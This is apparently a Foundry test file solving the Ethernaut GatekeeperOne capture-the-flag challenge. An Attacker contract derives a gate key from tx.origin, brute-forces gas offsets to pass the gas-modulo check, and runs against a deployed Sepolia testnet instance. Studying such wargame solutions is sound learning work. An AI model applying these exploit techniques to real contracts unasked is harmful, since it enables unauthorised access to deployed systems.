// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attacker {
    GatekeeperOne gatekeeper;
    address owner;
    constructor(GatekeeperOne _gatekeeper){
        gatekeeper = _gatekeeper;
        owner = msg.sender;
    }

    function attack() external {
        uint256 key = uint64(uint16(uint160(tx.origin)));

        uint256 mask = 0x1111111111111111111111111111111111111111111111111111111100000000;
        key = uint64(key | mask);

        bytes8 result = bytes8(uint64(key));
        for (uint256 i=0; i< 200; i++){
            console.log("i: %s", i);
            (bool success, ) = address(gatekeeper).call{gas:  8191 * 4 + i + 250 }(abi.encodeWithSignature("enter(bytes8)", result));
            if (success){
                break;
            }
        }
    }
}

contract GatekeeperTest is Test{
    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_gatekeeper1_attack() public{
        GatekeeperOne gatekeeper = GatekeeperOne(0xfa790EDf2C947fa7EEB863a17346360893969755);
        Attacker attacker = new Attacker(gatekeeper);
        attacker.attack();

        require(tx.origin == gatekeeper.entrant(), "GatekeeperOne: attack failed");
    }
}
